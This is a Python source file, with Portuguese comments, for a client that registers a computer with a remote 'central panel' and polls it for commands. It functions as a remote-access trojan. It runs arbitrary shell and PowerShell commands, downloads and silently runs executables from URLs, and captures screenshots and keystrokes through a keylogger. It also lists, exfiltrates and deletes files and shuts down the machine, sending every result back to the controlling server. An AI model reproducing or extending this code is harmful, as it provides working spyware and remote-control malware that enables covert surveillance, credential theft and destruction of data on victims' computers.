"""
CLIENTE CENTRAL - Conecta Program.py ao painel web Docker
"""

import requests
import json
import platform
import time
import threading

class CentralClient:
    def __init__(self, central_server_url: str, pc_name: str = None):
        self.central_url = central_server_url.rstrip('/')
        self.pc_name = pc_name or platform.node()
        self.registered = False
        self.heartbeat_thread = None
        self.running = False
        self.keylogger_active = False
        self.keylogger_logs = []
        self.keylogger_listener = None
    
    def register(self) -> bool:
        try:
            response = requests.post(
                f"{self.central_url}/api/register",
                json={
                    "pc_name": self.pc_name,
                    "system_info": self._get_system_info()
                },
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                self.registered = True
                self._start_heartbeat()
                print(f"[CENTRAL] {self.pc_name} registrado no painel")
                return True
            else:
                print(f"[ERRO] Falha ao registrar: HTTP {response.status_code} - {response.text}")
                return False
        except requests.exceptions.ConnectionError as e:
            print(f"[ERRO] Servidor central nao acessivel: {self.central_url}")
            return False
        except Exception as e:
            print(f"[ERRO] Erro ao registrar: {e}")
            return False
    
    def _get_system_info(self):
        try:
            return {
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor()
            }
        except:
            return {}
    
    def _start_heartbeat(self):
        self.running = True
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
    
    def _heartbeat_loop(self):
        retry_count = 0
        max_retries = 5
        retry_delay = 2
        
        while self.running:
            try:
                response = requests.post(
                    f"{self.central_url}/api/heartbeat",
                    json={"pc_name": self.pc_name},
                    timeout=10
                )
                
                if response.status_code == 200:
                    retry_count = 0
                    data = response.json()
                    commands = data.get('commands', [])
                    for cmd in commands:
                        if isinstance(cmd, str):
                            self._execute_command_string(cmd)
                        else:
                            self._execute_command(cmd)
                else:
                    retry_count += 1
                    if retry_count >= max_retries:
                        print(f"[CENTRAL] Falha ao conectar após {max_retries} tentativas")
                        retry_count = 0
                    time.sleep(retry_delay)
            except Exception as e:
                retry_count += 1
                if retry_count >= max_retries:
                    print(f"[CENTRAL] Servidor central indisponível: {e}")
                    retry_count = 0
                time.sleep(retry_delay)
            
            time.sleep(5)
    
    def _execute_command_string(self, cmd_string):
        """Executa comando simples (string) ou comando especial (!screenshot, !keylogger, etc)"""
        try:
            import subprocess
            cmd_string = cmd_string.strip()
            
            # Comandos especiais (começam com !)
            if cmd_string.startswith('!'):
                parts = cmd_string.split()
                cmd_name = parts[0][1:].lower()  # Remove '!' e converte para lowercase
                
                if cmd_name == 'screenshot':
                    result = self._capture_screenshot()
                    self._send_screenshot_to_server(result)
                
                elif cmd_name == 'keylogger':
                    action = parts[1] if len(parts) > 1 else 'start'
                    if action == 'start':
                        result = self._start_keylogger()
                    elif action == 'stop':
                        result = self._stop_keylogger()
                    elif action == 'logs':
                        result = self._get_keylogger_logs()
                    else:
                        result = f"Keylogger action desconhecida: {action}"
                    self._post_result(result)
                
                elif cmd_name == 'files':
                    action = parts[1] if len(parts) > 1 else 'list'
                    path = ' '.join(parts[2:]) if len(parts) > 2 else 'C:\\'
                    if action == 'list':
                        result = self._list_files(path)
                    elif action == 'download':
                        result = self._read_file(path)
                    elif action == 'delete':
                        result = self._delete_file(path)
                    else:
                        result = f"Files action desconhecida: {action}"
                    self._post_result(result)
                
                elif cmd_name == 'execute':
                    url = ' '.join(parts[1:]) if len(parts) > 1 else ''
                    result = self._execute_url(url)
                    self._post_result(result)
                
                else:
                    self._post_result(f"[WARN] Comando desconhecido: {cmd_string}")
            
            # Comandos normais do shell
            else:
                result = subprocess.check_output(cmd_string, shell=True, text=True, timeout=30)
                self._post_result(result)
        
        except Exception as e:
            self._post_result(f"[ERROR] {cmd_string}: {str(e)}")

    def _post_result(self, result_text):
        """Envia resultado para o servidor e imprime localmente"""
        print(f"[RESULT] {result_text}")
        try:
             requests.post(
                 f"{self.central_url}/api/result",
                 json={"pc_name": self.pc_name, "result": str(result_text)},
                 timeout=10
             )
        except Exception as e:
             print(f"[ERROR] Falha ao enviar resultado: {e}")
    
    def _send_screenshot_to_server(self, screenshot_data):
        """Envia screenshot para o servidor"""
        try:
            if isinstance(screenshot_data, dict) and 'image' in screenshot_data:
                img_base64 = screenshot_data['image']
                response = requests.post(
                    f"{self.central_url}/api/screenshot_capture/{self.pc_name}",
                    json={"image": img_base64},
                    timeout=10
                )
                print(f"[SCREENSHOT] Enviada ao servidor: {response.status_code}")
        except Exception as e:
            print(f"[ERROR] Falha ao enviar screenshot: {e}")

    def _execute_command(self, cmd):
        cmd_type = cmd.get('type')
        cmd_data = cmd.get('data', {})
        cmd_id = cmd.get('id')
        
        result = None
        
        try:
            if cmd_type == 'cmd':
                import subprocess
                result = subprocess.check_output(cmd_data.get('command', ''), shell=True, text=True, timeout=30)
            
            elif cmd_type == 'powershell':
                import subprocess
                result = subprocess.check_output(['powershell', '-Command', cmd_data.get('command', '')], text=True, timeout=30)
            
            elif cmd_type == 'shutdown':
                import os
                os.system('shutdown /s /t 0')
            
            elif cmd_type == 'restart':
                import os
                os.system('shutdown /r /t 0')
            
            elif cmd_type == 'screenshot':
                result = self._capture_screenshot()
            
            elif cmd_type == 'execute':
                url = cmd_data.get('url', '')
                result = self._execute_url(url)
            
            elif cmd_type == 'keylogger_start':
                result = self._start_keylogger()
            
            elif cmd_type == 'keylogger_stop':
                result = self._stop_keylogger()
            
            elif cmd_type == 'keylogger_logs':
                result = self._get_keylogger_logs()
            
            elif cmd_type == 'files_list':
                path = cmd_data.get('path', 'C:\\')
                result = self._list_files(path)
            
            elif cmd_type == 'files_delete':
                path = cmd_data.get('path', '')
                result = self._delete_file(path)
            
            elif cmd_type == 'files_download':
                path = cmd_data.get('path', '')
                result = self._read_file(path)
                
        except Exception as e:
            result = f"Error: {str(e)}"
        
        if cmd_id and result:
            try:
                requests.post(
                    f"{self.central_url}/api/result",
                    json={"command_id": cmd_id, "result": result},
                    timeout=10
                )
            except:
                pass
    
    def _capture_screenshot(self):
        try:
            import pyautogui
            import io
            import base64
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)
            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return {"type": "screenshot", "image": img_base64}
        except Exception as e:
            return f"Screenshot error: {str(e)}"
    
    def _execute_url(self, url):
        try:
            import subprocess
            import tempfile
            import os
            
            response = requests.get(url, timeout=60)
            if response.status_code != 200:
                return f"Download failed: HTTP {response.status_code}"
            
            ext = '.exe' if url.lower().endswith('.exe') else '.tmp'
            with tempfile.NamedTemporaryFile(delete=False, suffix=ext) as f:
                f.write(response.content)
                temp_path = f.name
            
            subprocess.Popen(temp_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return f"Executed: {url}"
        except Exception as e:
            return f"Execute error: {str(e)}"
    
    def _start_keylogger(self):
        try:
            if self.keylogger_active:
                return "Keylogger already running"
            
            self.keylogger_active = True
            self.keylogger_logs = []
            
            def on_press(key):
                if not self.keylogger_active:
                    return False
                try:
                    self.keylogger_logs.append(key.char)
                except:
                    self.keylogger_logs.append(f'[{key.name}]')
            
            from pynput import keyboard
            self.keylogger_listener = keyboard.Listener(on_press=on_press)
            self.keylogger_listener.start()
            return "Keylogger started"
        except Exception as e:
            return f"Keylogger error: {str(e)}"
    
    def _stop_keylogger(self):
        try:
            if self.keylogger_active:
                self.keylogger_active = False
                if self.keylogger_listener:
                    self.keylogger_listener.stop()
                return "Keylogger stopped"
            return "Keylogger not running"
        except Exception as e:
            return f"Keylogger stop error: {str(e)}"
    
    def _get_keylogger_logs(self):
        try:
            if self.keylogger_logs:
                logs = ''.join(self.keylogger_logs)
                return logs if logs else "No logs yet"
            return "Keylogger not started"
        except Exception as e:
            return f"Keylogger logs error: {str(e)}"
    
    def _list_files(self, path):
        try:
            import os
            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                item_type = 'dir' if os.path.isdir(full_path) else 'file'
                try:
                    size = os.path.getsize(full_path) if item_type == 'file' else 0
                except:
                    size = 0
                items.append({"name": item, "type": item_type, "size": size})
            return {"path": path, "items": items}
        except Exception as e:
            return f"List files error: {str(e)}"
    
    def _delete_file(self, path):
        try:
            import os
            if os.path.isfile(path):
                os.remove(path)
                return f"Deleted: {path}"
            elif os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
                return f"Deleted directory: {path}"
            return "File not found"
        except Exception as e:
            return f"Delete error: {str(e)}"
    
    def _read_file(self, path):
        try:
            import base64
            with open(path, 'rb') as f:
                content = f.read()
            return {"type": "file", "path": path, "content": base64.b64encode(content).decode('utf-8')}
        except Exception as e:
            return f"Read file error: {str(e)}"
    
    def log_command(self, cmd_type: str, command: str, output: str = "", status: str = "completed"):
        pass
    
    def log_error(self, error_msg: str):
        pass
    
    def log_system(self, message: str):
        pass
    
    def stop(self):
        self.running = False
        if self.keylogger_active:
            self._stop_keylogger()


if __name__ == "__main__":
    panel_url = os.environ.get('PANEL_URL', 'http://localhost:5000')
    client = CentralClient(
        central_server_url=panel_url,
        pc_name=platform.node()
    )
    
    if client.register():
        print("Registrado! Mantendo conexao...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            client.stop()
